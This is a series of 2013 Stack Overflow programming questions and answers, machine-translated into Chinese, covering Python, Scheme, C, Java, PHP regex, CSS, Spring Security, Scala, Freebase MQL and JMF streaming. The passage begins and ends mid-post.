    type = Column(Enum(u'Lion', u'Tiger', name='type'))
    color = Column(Enum('gold', 'orange', 'blackorange', 'whiteblue', name='color'))

from sqlalchemy import event

def my_check_sample_listener(mapper, connection, target):
    assert target.color in colors[target.type]

event.listen(Sample, 'before_insert', my_check_sample_listener)
event.listen(Sample, 'before_update', my_check_sample_listener)

sample = Sample(type='Tiger', color='orange')
session.add(sample)
session.commit() # Fails

sample = Sample(type='Lion', color='orange')
session.add(sample)
session.commit() # OK

sample.type = 'Tiger'
sample.color = 'whiteblue'
session.commit() # OK

sample.color = 'orange'
session.commit() # Fails 
```

# python - 删除数字末尾的点

> ID：16110777
> 
> 赞同：2
> 
> 时间：2013-04-19T17:58:04.273
> 
> 标签：python

我有一个看起来像这样的 txt 文件：

```
 1,           0.,           0.,           0.
  2,           0.,           0.,         600.
  3,           0.,           0.,        2600.
  4,           0.,           0.,          50. 
```

我想阅读它并创建以下列表：

```
['1', '0', '0', '0']
['2', '0', '0', '600']
['3', '0', '0', '2600']
['4', '0', '0', '50'] 
```

但是我只能设法获得：

```
['1', '0.', '0.', '0.']
['2', '0.', '0.', '600.']
['3', '0.', '0.', '2600.']
['4', '0.', '0.', '50.'] 
```

我的代码如下所示：

```
for line in inputFile:
    fileData.append([x.strip() for x in line.split(',')]) 
```

编辑：如何将我的字符串列表转换为整数列表？使用我上面编写的代码行尝试了一些变体，但无法实现。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-19T17:59:41.540

传递`"." + string.whitespace`给`strip`它以去除空格和句点：

```
from string import whitespace
for line in inputFile:
    fileData.append([int(x.strip("." + whitespace)) for x in line.split(',')]) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-19T17:59:21.343

```
for line in inputFile:
    fileData.append([int(x.strip().rstrip('.')) for x in line.split(',')]) 
```

`x.strip().rstrip('.')`您可以使用代替`x.strip(' \t\r\n.')`，但我认为让`x.strip()`处理所有空格更干净。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T18:16:26.793

```
with open('filename') as f:
    file_data = [[int(float(i)) for i in line.split(',')] for line in f] 
```

# ruby-on-rails - 如何避免其他人在简单的登陆注册表单中覆盖 hstore 记录？

> ID：16110778
> 
> 赞同：1
> 
> 时间：2013-04-19T17:58:04.780
> 
> 标签：ruby-on-rails, ruby, postgresql, hstore

我想建立一个简单的网站，其中包含不同数量的登陆页面，这些页面有不同的形式

具有两个字段的示例：`email`和`zipcode`

每个表单都有`email`字段和其他字段的随机数：`first_name`, `city`...

我想知道`hstore`用于完成每封电子邮件的属性，因为我不希望有多个记录具有相同的电子邮件和其他属性。

我只有一个担心，如果其他人知道数据库中已经存在的电子邮件地址，那么当其他人能够覆盖字段时，如何避免这种情况是一种很好的模式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-21T14:01:17.447

我认为 hstore 不会增加任何新的安全问题。简单的答案是像对待其他任何事情一样对待它，并检查适当的权限。例如，您可以添加密码检查以更新与电子邮件相关的信息。

有了这样的安全性，就有很多方法可以做事。您的第一个决定需要是在哪里实施安全性。在数据库中？在网络应用程序中？等等。从那里开始，安全决策应该是相对明显的。例如，这决定了在哪里检查密码，以及在哪里检查是否只能更新适当的电子邮件。这里的最佳答案将取决于您的环境。

如果这是一个简单的网站，您可能希望在 Web 应用程序级别强制执行适当的行为。具体情况取决于您选择的语言等。

# scheme - 操纵方案评估器

> ID：16110779
> 
> 赞同：0
> 
> 时间：2013-04-19T17:58:05.523
> 
> 标签：scheme, racket

我正在尝试操作 Scheme 评估器并编写一个`make-unbound!`从环境中取消绑定变量的过程：

```
(define (make-unbound! var env)
  (let ((frame (first-frame env)))
      (define (scan vars vals)
        (let ((new-frame 
                (make-frame 
                  (zip 
                    (filter (lambda (x) (not (eq? x (car vars)))) vars)
                    (filter (lambda (x) (not (eq? x (car vals)))) vals))
                  env)))
        (cond ((null? vars) 
               (display '(No frame to unbind)))
              ((eq? var (car vars))
               (set-car! vars new-frame)) ; the problem seems to be here
              (else (scan (cdr vars) (cdr vals))))))
      (scan (frame-variables frame)
            (frame-values frame)))) 
```

问题似乎出在我设置变量*汽车的位置。*但我不确定它应该改成什么......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:38:02.743

这看起来像 SICP 的练习 4.13。`make-unbound!`可以使用 Racket 像这样评估特殊形式：

```
(define (remove-association! key lst)
  (define (loop prev l)
    (cond ((null? l) lst)
          ((equal? (mcar (mcar l)) key)
           (set-mcdr! prev (mcdr l))
           lst)
          (else (loop l (mcdr l)))))
  (cond ((null? lst) '())
        ((eq? (mcar (mcar lst)) key) (mcdr lst))
        (else (loop lst (mcdr lst)))))

(define (unbind-variable! var env)
  (define (env-loop env)
    (define (scan bindings)
      (cond ((massq var bindings)
             (set-mcar! env (remove-association! var bindings)))
            (else (env-loop (enclosing-environment env)))))
    (unless (eq? env the-empty-environment)
      (scan (first-frame env))))
  (env-loop env))

(define (unbound-variable exp)
  (cadr exp))

(define (eval-make-unbound! exp env)
  (unbind-variable! (unbound-variable exp)
                    env)) 
```

它会删除与给定符号一起找到的第一个绑定，无论是在当前帧中还是在其任何封闭环境中。如果符号一开始是未绑定的，则它什么也不做。我选择以这种方式实现 unbind 操作，以便封闭环境中的（可能的）绑定保持不变。

不要忘记在过程中指定要使用该过程评估`eval`特殊形式。`make-unbound!``eval-make-unbound`

另外，请注意，我使用 Racket 的可变对库实现了我的实现，因此我使用的过程名称有时`m`在其名称中的某处有一个额外的地方，这意味着：它们是为*可变*对定义的。例如：`mcar, mcdr, set-mcar!, set-mcdr!, massq`。如果没有找到之前的任何过程，只需`m`从名称中删除 并重试。

# c - 从字符串中提取字母和数字

> ID：16110783
> 
> 赞同：3
> 
> 时间：2013-04-19T17:58:25.567
> 
> 标签：c

我在分配作业时遇到了一些困难，想知道是否可以得到一些帮助。无论如何，任务是：“你必须从键盘输入随机字母和数字。字符串应该从程序中分析出来，之后所有数字都必须被提取，它还必须总结它们。例如输入：asd-12sdf45-56asdf100 输出：77

```
#include<stdio.h> 
#include<stdlib.h> 
#include<ctype.h> 
#include<string.h> 

int main() { 
    char stringText[50]; 
    char arraySaver[50]; 

    int i=0, j=0, k=0; 

    printf("Enter String: "); 
    scanf("%s", &stringText); 

    for(i=0; i<strlen(stringText); i++) { 
        if(isdigit(stringText[i])) { 
            arraySaver[j]=stringText[i]; 
            j++; 
        } 
    } 

    system("pause"); 
    return 0; 
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:06:17.100

由于这是家庭作业，我不打算写出解决方案的代码。但是，您*已经*很接近了。你有你的数字数组。您现在需要做的就是：

1.  迭代`arraySaver`。
2.  打印出每个元素。
3.  在外部变量中保持运行总计，例如`sum`。
4.  在循环之外，打印`sum`。

**更新**

我不确定作业的要求是什么，但是如果您需要查看单个数字，那么您可以。但是如果您需要查看负数，或者如果您需要将一个数字的运行视为单个数字，那么您将需要做更多的工作：

1.  如果字符是负数，那么您假设它可能是负数；设置一个标记它的标志。
2.  如果字符是数字，则假定它是数字的开头。继续阅读，直到遇到非数字字符，同时跟踪每个数字。
3.  保存到目前为止您已阅读的数字，同时考虑符号（即，您的标志表明它是否为负数）。

其余代码应该类似。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:17:54.080

你很接近，但你应该使用`fgets()`而不是`scanf()`，然后通过其他方式解析字符串（即：`sscanf`，以避免捕获换行符等各种问题）。如果您所要做的就是对个位数求和，这将起作用。对于更复杂的事情（即：此代码中的 abc12abc 被求和为“一加二”而不是评估为“十二”），您将需要更复杂的逻辑。

这里有一个提示：您需要在现有循环中创建另一个循环，看起来像`while(isdigit[k++])`. 祝你好运！

```
#include<stdio.h>
#include<stdlib.h>
#include<ctype.h>
#include<string.h>
#define MAX_BUF_LENGTH  (50)

int main(void) {
   char buf[MAX_BUF_LENGTH]     = { 0 };
   char digits[MAX_BUF_LENGTH]  = { 0 };
   char temp[MAX_BUF_LENGTH]    = { 0 };
   int i, j;
   int sum = 0;

   printf("Enter String: ");
   fgets (buf,MAX_BUF_LENGTH,stdin);

   /* Analyze the input string, and backup each digit while maintaining
    * a running sum.
    */
   for(i=0,j=0; i<strlen(buf); i++) {
      if(isdigit(buf[i])) {
         digits[j] = buf[i];
         j++;
         snprintf(temp, MAX_BUF_LENGTH, "%c", buf[i]);
         sum += atoi(temp);
      }
   }
   printf("Original String:%s\n", buf);
   printf("Digit String:   %s\n", digits);
   printf("Sum of Digits:  %d\n", sum);

   system("pause");
   return 0;
} 
```

# java - PHP - 安装 JavaBridge.war 时出错

> ID：16110786
> 
> 赞同：0
> 
> 时间：2013-04-19T17:58:51.663
> 
> 标签：java, php, tomcat, xampp, php-java-bridge

我正在尝试安装 JavaBridge，因为我想在我的 php 文件和 Java 文件之间建立连接。我需要我的 php 请求一个对 Java 文件的 GET 方法，Java 文件将获取 ID 并运行一些脚本并返回一个 ARRAY。

```
I tried to install JavaBridge, but I get errors while trying to excess to localhost:8080/JavaBridge

javax.servlet.ServletException: php.java.bridge.http.FCGIConnectException: Could not connect to     server

php.java.bridge.http.FCGIConnectException: Could not connect to server

java.io.IOException: File \\.\pipe\C:\apache-tomcat-7.0.39\temp\JavaBridge939398813756155712.socket not writable

java.io.IOException: PHP not found. Please install php-cgi. PHP test command was: [php-cgi, -v] 
```

我没有在这里显示所有错误，我只显示了每个根本原因的第一行。

我将在我的设置中提供更多详细信息。我一直在使用 XAMPP，在 XAMPP 中使用 PHP、MySQL。

然后我刚刚安装了 Tomcat 以安装 JavaBridge。我将 JavaBridge.war 复制到 c:/tomcats/webapps，将 JavaBridge.jar 和 php-servlet.jar 复制到 c:/tomcats/lib

我认为问题应该出在 PHP 上，但我也不知道如何解决它。重新安装PHP？但我也不确定。

我的设置有什么问题？

或者还有其他方法可以像我上面所说的那样在 PHP 和 Java 之间建立联系？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-03T01:57:39.847

你启用了 php-cgi 吗？

这是你可以做到的。转到：`xampp\apache\conf\extra\httpd-xampp.conf`并取消注释：

```
<FilesMatch "\.php$">
    SetHandler application/x-httpd-php-cgi
</FilesMatch>
<IfModule actions_module>
    Action application/x-httpd-php-cgi "/php-cgi/php-cgi.exe"
</IfModule> 
```

重新启动 Apache 和 Tomcat。

# php - 正则表达式 - preg_replace - 替换段落内的特定内容

> ID：16110787
> 
> 赞同：1
> 
> 时间：2013-04-19T17:58:52.437
> 
> 标签：php, regex

我正在尝试实现仅替换`<p>`标签之间的特定单词的功能

例如：

```
<p>this is word i need to replace</p> 
```

在这种情况下，“单词”将被替换为其他单词（但仅限于`<p>`标签内）

目前我正在使用：

```
preg_replace("/\b$keyword\b/", $replaceWord, $content, 2);

$content - contains all html
$keyword - word wich need to be replaced in that content
$replaceWord - word wich we want to use instead $keyword 
```

但是上面的这个逻辑也将替换不在段落内的关键字。如何更新这个正则表达式，所以它只替换段落内的单词？

注意：请注意我不能使用[Simple HTML DOM Parser](http://simplehtmldom.sourceforge.net/)

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-19T18:09:20.173

我不熟悉 php，但这里是 python。我想我会尽力帮助你，因为你有一段时间没有得到答复。您可以看到我正在匹配并存储单词周围的内容，然后将其添加回我的替换项中，称为“新单词”。而且它确实忽略了 < h1 > 标签内的单词“word”。

```
>>> import re
>>> a = "<p>this is word i need to replace</p>"
>>> a += "\n<h1>blah blah crud word</h1>"
>>> re.sub("(<p>.*?)word(.*?</p>)","\g<1>new word\g<2>",a)
'<p>this is new word i need to replace</p>\n<h1>blah blah crud word</h1>' 
```

# html - 多列定义列表

> ID：16110794
> 
> 赞同：6
> 
> 时间：2013-04-19T17:59:14.770
> 
> 标签：html, css, twitter-bootstrap

我有一个`<dl>`这样的：

```
<dl>
<dt id="a_1">Quantity:
<dd id="a_2">
<dt id="b_1">Size:
<dd id="b_2">
<dt id="c_1">Rise:
<dd id="c_2">
<dt id="d_1">Color:
<dd id="d_2">
....
</dl> 
```

这个列表是通过 php.ini 动态生成的。我有一个一定高度的容器。当它变得太大时，将这个列表分成两列的最佳方法是什么？如果可能，我想将其保留为 dl，尽管这不是绝对必要的。

如果它有帮助，我正在使用引导程序。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-19T18:23:14.910

最优雅的方法是使用 CSS 列属性：

[http://codepen.io/cimmanon/pen/tcyHv](http://codepen.io/cimmanon/pen/tcyHv)

```
dl {
  columns: 2;
}

dd {
  break-before: avoid;
} 
```

对它的支持相当不错，但 Firefox 不支持该`break-before`属性（用于防止定义出现在与其术语不同的列中）。可能需要添加前缀。

[http://caniuse.com/#feat=multicolumn](http://caniuse.com/#feat=multicolumn)

# java - 如何检查uri指向的铃声是否存在？

> ID：16110796
> 
> 赞同：5
> 
> 时间：2013-04-19T17:59:25.577
> 
> 标签：java, android, uri, ringtone

我可以使用以下代码播放铃声

```
rone = RingtoneManager.getRingtone(this.getContext(), Uri.parse(one));
rone.play(); 
```

如何检查uri指向的音频文件是否存在？当用户从他们的手机中删除一个文件时，我无法播放铃声并且它崩溃了。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T18:11:56.150

`getRingtone()`如果铃声不存在，将返回 null。

始终检查返回值是否不为空，这是一个很好的做法，每当您调用可能返回空值的方法时。这将阻止很多`NullPointerException`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-10T19:31:03.043

尝试使用`getRingtonePosition()`方法而不是`getRingtone()`：

```
final RingtoneManager rm = new RingtoneManager(preference.getContext());
final Uri loadedRingtoneUri = Uri.parse(ringtoneUriString);
final int pos = rm.getRingtonePosition(loadedRingtoneUri);

// if loaded ringtone uri is valid, use it or use default
final Ringtone ringtone = RingtoneManager.getRingtone(preference.getContext(),
                        (pos != -1) ? loadedRingtoneUri :
                                      Settings.System.DEFAULT_RINGTONE_URI); 
```

# vb.net - Windows Phone 8：动态加载/创建 HTML 并加载到浏览器中

> ID：16110798
> 
> 赞同：2
> 
> 时间：2013-04-19T17:59:32.250
> 
> 标签：vb.net, windows-phone-8

我正在开发一个应用程序，它可以读取 XML 并相应地显示 XML 中包含的内容。现在我已经完成了 XML 部分，但我还需要另一部分，即将一小段 html 代码加载到 Web 浏览器元素中。无论如何，我是否可以动态创建一个 html 文件（我在想可能创建一个并保存在存储中然后从那里加载？）或直接将代码插入 Web 浏览器元素。

如果做不到这一点，我将在我的服务器上创建一个 php 页面，该页面会根据其传递的值进行调整。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:06:02.730

您可以将整个 HTML 代码存储在字符串变量中并调用[NavigateToString](http://msdn.microsoft.com/en-us/library/windowsphone/develop/microsoft.phone.controls.webbrowser.navigatetostring%28v=vs.105%29.aspx)方法。

```
myWebBrowser.NavigateToString("myHTMLcode") 
```

您如何创建 HTML 字符串取决于您的应用程序，但您可以存储一个基本模板并用于`String.Replace`替换代码中的任何特定项目。

# ios - 如何在 URL 中将“&”作为字符串传递？

> ID：16110804
> 
> 赞同：0
> 
> 时间：2013-04-19T18:00:11.100
> 
> 标签：ios, objective-c

在我的应用程序中，我将一个字符串传递给服务，该服务将一些数据设置为远程数据库。就我的字符串中没有“&”而言，一切都很完美。

我正在使用它来传递参数：

```
NSString *urlString = [[NSString
 stringWithFormat:@"http://someservice.com/some/some_setstatus.php?status=active&name=%@",
 merchant] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; 
```

我的猜测是，当它使用保存在数据库中的名称检查名称时，由于“&”，它无法找到一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:10:36.043

您无法传递“&”，因为它将被视为 URL 参数的分隔符。“&”是保留字符，您可以考虑将“&”编码为允许字符的组合。看看[RFC 3986](http://www.ietf.org/rfc/rfc3986.txt)和[这个](https://stackoverflow.com/questions/1856785/characters-allowed-in-a-url)问题的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T19:23:03.927

您需要转义`&`url 的字符（更多信息：[http](http://www.ietf.org/rfc/rfc3986.txt) ://www.ietf.org/rfc/rfc3986.txt ）
看看[https://github.com/tagyro/GTM/blob/master/Foundation/ GTMNSString%2BURLArguments.h](https://github.com/tagyro/GTM/blob/master/Foundation/GTMNSString%2BURLArguments.h)
这是来自他们的 SVN 的 Google Toolbox for Mac 的克隆。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-19T18:04:07.640

我相信您需要对字符串进行 urlEncode 编码，该字符串将正确编码任何特殊字符。有关详细信息，请参阅[http://www.w3schools.com/tags/ref_urlencode.asp](http://www.w3schools.com/tags/ref_urlencode.asp)。

问候，

史蒂夫

# java - StringTokenizer - 如何忽略字符串中的空格

> ID：16110808
> 
> 赞同：1
> 
> 时间：2013-04-19T18:00:45.690
> 
> 标签：java, string

我正在尝试在以下单词列表中使用 stringtokenizer

```
String sentence=""Name":"jon" "location":"3333 abc street" "country":"usa"" etc 
```

当我使用 stringtokenizer 并将空格作为分隔符时，如下所示

```
StringTokenizer tokens=new StringTokenizer(sentence," ") 
```

我期待我的输出为不同的标记，如下所示

```
Name:jon

location:3333 abc street

country:usa 
```

但是字符串标记器也尝试标记位置的值，它看起来像

```
Name:jon

location:3333

abc

street

country:usa 
```

请让我知道如何解决上述问题，如果我需要做一个正则表达式，我应该指定什么样的表达式？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T18:20:14.980

这可以使用[CSV Reader](http://sourceforge.net/projects/javacsv/)轻松处理。

```
String str = "\"Name\":\"jon\" \"location\":\"3333 abc street\" \"country\":\"usa\"";

// prepare String for CSV parsing
CsvReader reader = CsvReader.parse(str.replaceAll("\" *: *\"", ":"));
reader.setDelimiter(' '); // use space a delimiter
reader.readRecord(); // read CSV record
for (int i=0; i<reader.getColumnCount(); i++) // loop thru columns
    System.out.printf("Scol[%d]: [%s]%n", i, reader.get(i)); 
```

### 更新：这是纯 Java SDK 解决方案：

```
Pattern p = Pattern.compile("(.+?)(\\s+(?=(?:(?:[^\"]*\"){2})*[^\"]*$)|$)");
Matcher m = p.matcher(str);
for (int i=0; m.find(); i++)
    System.out.printf("Scol[%d]: [%s]%n", i, m.group(1).replace("\"", "")); 
```

**输出：**

```
Scol[0]: [Name:jon]
Scol[1]: [location:3333 abc street]
Scol[2]: [country:usa] 
```

### 现场演示：http: [//ideone.com/WO0NK6](http://ideone.com/WO0NK6)

### 说明：根据OP的评论：

我正在使用这个正则表达式：

```
(.+?)(\\s+(?=(?:(?:[^\"]*\"){2})*[^\"]*$)|$) 
```

现在把它分解成更小的块。

PS：DQ代表双引号

```
(?:[^\"]*\")                    0 or more non-DQ characters followed by one DQ (RE1)
(?:[^\"]*\"){2}                 Exactly a pair of above RE1
(?:(?:[^\"]*\"){2})*            0 or more occurrences of pair of RE1
(?:(?:[^\"]*\"){2})*[^\"]*$     0 or more occurrences of pair of RE1 followed by 0 or more non-DQ characters followed by end of string (RE2)
(?=(?:(?:[^\"]*\"){2})*[^\"]*$) Positive lookahead of above RE2

.+?  Match 1 or more characters (? is for non-greedy matching)
\\s+ Should be followed by one or more spaces
(\\s+(?=RE2)|$) Should be followed by space or end of string 
```

**简而言之：**这意味着匹配 1 个或更多长度的任何字符，后跟“空格或字符串结尾”。空格后面必须跟**偶数个 DQ**。因此，双引号外的空格将被匹配，而双引号内的空格将不被匹配（因为它们后面跟着**奇数个 DQ**）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:27:14.443

StringTokenizer 对于这项工作来说太简单了。如果您不需要处理值内的引号，您可以试试这个正则表达式：

```
String s = "\"Name\":\"jon\" \"location\":\"3333 abc street\" \"country\":\"usa\"";
Pattern p = Pattern.compile("\"([^\"]*)\"");
Matcher m = p.matcher(s);
while (m.find()) {
    System.out.println(m.group(1));
} 
```

输出：

> 名称
> jon
> 位置
> 3333 abc 街
> 国家
> 美国

这不会处理值中的内部引号 - 输出应该在哪里，例如，

> 姓名：弗雷德（“弗莱迪”）琼斯

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T18:08:20.240

您可以使用 Json，看起来您正在使用 Json 类型的模式。做一点谷歌并尝试实现 Json。

```
String sentence=""Name":"jon" "location":"3333 abc street" "country":"usa"" etc 
```

将是 Json 中的键、值对，例如名称是键，Jon 是值。位置是关键，3333 abc 街是价值。等等....

试试看。这是一个链接 [http://www.mkyong.com/java/json-simple-example-read-and-write-json/](http://www.mkyong.com/java/json-simple-example-read-and-write-json/)

编辑：它只是一个有点傻的答案，但你可以尝试这样的事情， sentence = sentence.replaceAll("\" ", " *"); StringTokenizer tokens=new StringTokenizer(sentence,"* ");

# javascript - javascript log() vs document.write() - 使用哪个？

> ID：16110810
> 
> 赞同：0
> 
> 时间：2013-04-19T18:00:48.620
> 
> 标签：javascript, logging, document.write

我正在使用 Remy Sharp 的 twitterlib：[https](https://github.com/remy/twitterlib) ://github.com/remy/twitterlib ，在示例文件中，他使用 log(//stuff) 输出到屏幕。我以前只遇到过 document.write() 来填补这个容量，并且只看到 log() 与控制台日志记录结合使用。这是片段（请看第 4 行和第 6 行）：

```
var count = 0, limit = 2;
twitterlib.timeline('rem', { limit: 5 }, function (tweets) {
  count++;
  log('<strong>Tweets requested in hit ' + count + '</strong>');
  for (var i = 0; i < tweets.length; i++) {
    log(this.ify.clean(tweets[i].text));
  }

  if (count < limit) {
    this.next();
  }
}); 
```

我找不到关于 log() 作为输出到屏幕的独立 javascript 方法的任何信息，所以我想知道继续使用它是否是个好主意，或者我是否应该以另一种方式写入屏幕（例如document.write() 或 jQuery DOM 操作）以获得更可预测的结果。

有什么资料吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:22:56.467

如果您查看该代码的正上方，您会发现 log 的函数定义：

```
function log(s) {
    document.getElementById('debug').innerHTML += '<p>' + s + '</p>';
} 
```

由于 Paul Irish 将其作为包装器包含在 html5bootstrap 中的 console.log 中，因此您会看到很多日志；但在这些情况下，它会打印到控制台而不是窗口。通常，您应该避免使用 document.write 并改用上述异步友好的方法。请参阅 Douglas Crockford 的解释：http: [//javascript.crockford.com/script.html](http://javascript.crockford.com/script.html)。

# spring-security - 绕过 URL 的 Spring Security 过滤器

> ID：16110812
> 
> 赞同：3
> 
> 时间：2013-04-19T18:00:54.557
> 
> 标签：spring-security

我修改了我`applicationContext-security-preauth.xml`的目标，目的是从特定 URL 中删除过滤器。

我在使用 spring-security-oauth 过滤器时遇到问题，因此我想暂时避免将此过滤器用于特定请求。

`<intercept-url pattern="/notsecure/**" access="IS_AUTHENTICATED_ANONYMOUSLY"/>`

`/notsecure/`根据我的日志，在构建和复制新的 JAR，然后刷新 Tomcat 之后，我的HTTP 请求仍然命中了这个过滤器。

考虑到我的配置更改，我不会期望任何过滤器被命中。

**编辑**：我正在使用 Spring Security 2

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:04:09.467

如果您想避免点击该 URL 的任何过滤器，您将需要一个额外的`<http>`元素，如下所示：

```
<security:http pattern="/notsecure/**" security="none"/> 
```

（这仅适用于 Spring Security 3.1+）

`IS_AUTHENTICATED_ANONYMOUSLY`要求通过过滤器（即`AnonymousAuthenticationFilter`）对请求进行匿名身份验证。

# oop - 在使用 scala 的函数式编程中在副作用和良好的 API 设计之间进行选择

> ID：16110815
> 
> 赞同：2
> 
> 时间：2013-04-19T18:00:59.597
> 
> 标签：oop, scala, functional-programming

我正在将我作为学习练习编写的 java 应用程序移植到 scala。其中一部分是使用直接通过 TCP 的协议与另一台机器进行通信。该协议有 2 层（应用层和传输层），带有相应的标头和尾标。所以给定的消息最终看起来像

> 标题 | 标题 | 留言 | 预告片 | 拖车

我想用一个

```
trait Layer{
   def write(s:String) : Unit
   def read :String
} 
```

每一层都会用它的头|尾来完成消息并将其传递给下一层。然后我会有一个`TransportLayer`和一个`ApplicationLayer`我可以结合在一个实现中，比如

```
 val layer = new TcpLayer with ApplicationLayer with TransportLayer 
```

我对这个设计很兴奋，它让我可以随意重用组件。然后我的困境出现了：

*   为了避免副作用，`write`方法不应该返回`Unit`，而是修改后的`String`，然后应该发送。这最大限度地减少了副作用，简化了测试，但是客户端代码需要`String`通过套接字本身发送完成（这已经有副作用但没有办法绕过那个，或者？）。
*   由于客户端代码应该“触发并忘记”，它应该能够调用`write`给定的`Layer`并且不关心修改`String`（无论如何这对他来说可能是胡言乱语）。因此我认为返回`Unit`是返回值的正确选择。

关于哪个版本对函数式编程更友好的任何深思熟虑的见解？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:19:56.770

如果唯一的副作用是在套接字中，那么这个怎么样：

```
val layers = new TcpLayer with ApplicationLayer with TransportLayer
socket.write (layers.write (message))
unitTestEngine.check (layers.write (message)) 
```

或者，如果客户只能`layer`使用，那么：

```
val layers = new TcpLayer (socket) with ApplicationLayer with TransportLayer
layers.sink (layers.write (message))
unitTestEngine.check (layers.write (message)) 
```

`sink`返回 Socket 实例的方法在哪里。

# wordpress - WordPress 小部件在框架或 div 中显示多个图像

> ID：16110816
> 
> 赞同：-1
> 
> 时间：2013-04-19T18:01:05.127
> 
> 标签：wordpress

是否有任何可用的 word-press 小部件/插件可以以时间间隔自动切换 div 或框架中的图像。?

我的要求是有一个 div 或一个框架，它可以一次显示一个图像，并在一段时间后自动移动到下一个图像。

类似的例子之一是英国广播公司网站（www.bbc.co.uk）中的“热门新闻部分”。

如果 word-press 没有插件，请告诉我这是否可以通过 java-script 实现，或者我需要为此使用一些 flash 插件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T19:33:45.730

如果您需要插件，请查看此处。

[http://5wpthemes.com/we-recommend/](http://5wpthemes.com/we-recommend/)

同样从您的 wordpress 仪表板，转到插件 - 添加新并搜索所需的插件。

# freebase - 使用 Freebase 中的属性关联两个实体

> ID：16110819
> 
> 赞同：1
> 
> 时间：2013-04-19T18:01:13.080
> 
> 标签：freebase, mql

我想了解一下苏文锦和集美大学在 Freebase 中的关系。我发现 Wenjin SU 有一个类型`/business/board_member/`，它有属性`/business/board_member/leader_of`。如何在 Freebase MQL 中使用这些信息来提取集美大学的学期或学期？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:28:17.687

如果您访问[Wenjin SU](https://www.freebase.com/m/0sxhm9v)的 Freebase 页面，您会看到他有该类型`/business/board_member/`，并且在该部分下将他列为`/business/board_member/leader_of` [集美大学](https://www.freebase.com/m/03pw6w)

您应该做的第一件事是转到[查询编辑器](https://www.freebase.com/query)并为该关系创建一个骨架 MQL 查询：

```
{
  "id": "/m/0sxhm9v",
  "name": null,
  "/business/board_member/leader_of": [{}]
} 
```

运行此查询时，您会得到以下结果：

```
{
  "result": {
    "name": "Wenjin SU",
    "/business/board_member/leader_of": [{
      "name": null,
      "type": [
        "/organization/leadership"
      ],
      "id": "/m/0sxhm9s"
    }],
    "id": "/m/0sxhm9v"
  }
} 
```

这不是你所要求的。据说他是`leader_of`一个未命名的话题[/m/0sxhm9s](https://www.freebase.com/m/0sxhm9s)。现在，如果您访问该主题的 Freebase 页面，您将看到它是一个中介节点，它将个人及其角色与特定日期范围内的组织联系起来。您还会注意到集美大学`/organization/leadership/organization`在此页面上被列为。

我们现在可以将此中介属性添加到我们的 MQL 查询中，以获得您正在寻找的完整关系：

```
{
  "id": "/m/0sxhm9v",
  "name": null,
  "/business/board_member/leader_of": [{
    "/organization/leadership/organization": {
    }
  }]
} 
```

如果您要构建的应用程序具有这样一组预先确定的关系，那么您可以使用探索 Freebase 数据的过程来为这些关系构建 MQL 查询。如果你想在 Freebase 中找到任意两个实体之间的任意连接，那么你需要下载[Freebase 数据转储](https://developers.google.com/freebase/data)并在整个图形上运行[最短路径算法。](http://en.wikipedia.org/wiki/Shortest_path)

# mp3 - Jmf Mp3 文件不在 rtp 上流式传输

> ID：16110820
> 
> 赞同：2
> 
> 时间：2013-04-19T18:01:16.287
> 
> 标签：mp3, audio-streaming, jmf

播放器 mp3 给出错误：

```
RTP Handler internal error: javax.media.ControllerErrorEvent[source=com.sun.medi
a.content.unknown.Handler@baf4ae,message=Internal module com.sun.media.BasicRend
ererModule@197f158: failed to handle a data format change!]

i m running 
server as:java MediaConverterExample rtp://rajneesh-pc:49150/audio   Dead_End.mp3

client as:java PlayerExample rtp://rajneesh-pc:49150/audio 
```

这是服务器端代码

```
 import javax.media.*;
     import java.io.File;
     import java.io.IOException;
          import java.net.URL;
            import java.net.MalformedURLException;
          import javax.media.protocol.*;
          import javax.media.format.AudioFormat;

      import javax.swing.*;
     import java.awt.*;
         import java.awt.event.*;

         class MediaConvertion
      {
         private MediaLocator mediaLocator = null;

       private DataSink dataSink = null;

      private Processor mediaProcessor = null;

      private static final Format[] FORMATS = new Format[]                          {                   new AudioFormat(AudioFormat.MPEG_RTP)};

               private static final ContentDescriptor CONTENT_DESCRIPTOR =new    ContentDescriptor  (ContentDescriptor.RAW_RTP);

           public MediaConvertion(String url)throws IOException,NoProcessorException,   CannotRealizeException, NoDataSinkException, NoDataSinkException
 {
mediaLocator=new MediaLocator(url); 
```

}

```
 public void setDataSource(DataSource ds) throws      IOException,NoProcessorException,                      CannotRealizeException, NoDataSinkException {

             mediaProcessor = Manager.createRealizedProcessor(new ProcessorModel(ds, FORMATS,                               CONTENT_DESCRIPTOR));
            dataSink = Manager.createDataSink(mediaProcessor.getDataOutput(),mediaLocator);
     }

       public void startTransmitting() throws IOException {
  mediaProcessor.start();
      dataSink.open();
        dataSink.start();
        }

          public void stopTransmitting() throws IOException {
        dataSink.stop();
      dataSink.close();
       mediaProcessor.stop();
        mediaProcessor.close();
         }
                }

